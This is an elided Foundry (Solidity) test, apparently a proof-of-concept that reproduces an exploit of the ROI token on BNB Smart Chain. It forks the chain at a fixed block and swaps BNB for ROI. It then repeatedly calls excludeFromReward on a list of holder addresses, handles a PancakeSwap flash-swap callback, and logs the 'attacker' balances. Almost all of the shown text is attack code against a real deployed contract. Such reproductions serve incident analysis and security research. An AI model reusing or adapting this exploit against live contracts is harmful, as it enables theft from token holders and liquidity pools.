...
contract Attacker is Test {
    ...
    IPancakePair constant busdroiPair =
        IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124); // BUSD/ROI Pair

    function setUp() public {
        vm.createSelectFork("bsc", 21_143_795);
        vm.deal(address(this), 5 ether);
        vm.label(address(ROI), "ROI");
        vm.label(address(busd), "BUSD");
        vm.label(address(wbnb), "WBNB");
        vm.label(address(pancakeRouter), "PancakeRouter");
        vm.label(address(busdroiPair), "BUSD/ROI Pair");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker BNB Balance:",
        ...
        emit log_named_decimal_uint(
            "\tBNB balance of attacker:",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "\tROI balance of attacker:",
            ROI.balanceOf(address(this)),
            9
        );
        ...
        pancakeRouter.swapETHForExactTokens{value: 5 ether}(
            111_291_832_999_209,
            path,
            address(this),
            block.timestamp
        ); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee
        ...
        ROI.excludeFromReward(
            address(0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722)
        );
        ROI.excludeFromReward(
            address(0x216FC1D66677c9A778C60E6825189508b9619908)
        );
        ROI.excludeFromReward(
            address(0x61708418F929f264Edd312aDC7089eB9d69cEd9C)
        );
        ROI.excludeFromReward(
            address(0xC81DC8F793415B80d7Ee604e936B79D85BD771B6)
        );
        ROI.excludeFromReward(
            address(0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C)
        );
        ROI.excludeFromReward(
            address(0xA982444d884e00C7dFBBCB90e7a705E567853d0E)
        );
        ROI.excludeFromReward(
            address(0x899045B0B52d55Be0210A1046a01B99C78E44540)
        );
        ROI.excludeFromReward(
            address(0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F)
        );
        ROI.excludeFromReward(
            address(0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8)
        );
        ROI.excludeFromReward(
            address(0x6f84160a01f3D4005eB50582d14F17B72575A80A)
        );
        ROI.excludeFromReward(
            address(0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96)
        );
        ROI.excludeFromReward(
            address(0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b)
        );
        ...
        emit log_named_decimal_uint(
            "\tBUSD balance of attacker:",
            busd.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "\tROI balance of BUSD/ROI Pair:",
            ROI.balanceOf(address(busdroiPair)),
            9
        );
        emit log_named_decimal_uint(
            "\tBUSD balance of BUSD/ROI Pair:",
            busd.balanceOf(address(busdroiPair)),
            18
        );
    ...
    function pancakeCall(
        ...
        require(
            keccak256(data) == keccak256("3030"),
            "Invalid PancakeSwap Callback"
        );
